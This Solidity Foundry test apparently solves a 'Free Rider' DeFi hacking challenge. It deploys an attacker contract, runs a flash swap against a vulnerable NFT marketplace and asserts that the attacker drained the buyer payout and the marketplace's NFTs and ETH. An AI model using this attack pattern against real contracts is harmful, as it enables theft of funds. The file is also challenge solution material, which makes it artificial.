// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./utils/FreeRiderFixture.sol";

import "src/src-default/attacker-contracts/AttackFreeRider.sol";

contract FreeRiderTest is FreeRiderFixture {
    AttackStealer public attackContract;

    function setUp() public override {
        super.setUp();
    }

    function test_freeRider() public {
        // Start acting as the attacker for the remainder of the exploit
        vm.startPrank(attacker, attacker);

        // Code your exploit here

        attackContract = new AttackStealer(
            payable(address(weth)),
            factory,
            address(token),
            payable(address(marketplace)),
            address(buyerContract),
            address(nft)
        );

        attackContract.flashSwap(address(weth), NFT_PRICE);

        // Stop acting as the attacker
        vm.stopPrank();
        // Perform exploit validations
        _assertions();
    }

    function _assertions() internal {
        // Attacker earned all ETH from payout
        assertGt(attacker.balance, BUYER_PAYOUT);
        assertEq(address(buyerContract).balance, 0);

        // The buyer extracts all NFTs from his contract
        vm.startPrank(buyer);
        for (uint256 id = 0; id < AMOUNT_OF_NFTS; id++) {
            nft.transferFrom(address(buyerContract), buyer, id);
            assertEq(nft.ownerOf(id), buyer);
        }
        vm.stopPrank();

        // Exchange lost all NFTs and ETH
        assertEq(marketplace.amountOfOffers(), 0);
        assertLt(address(marketplace).balance, MARKETPLACE_INITIAL_ETH_BALANCE);
    }
}
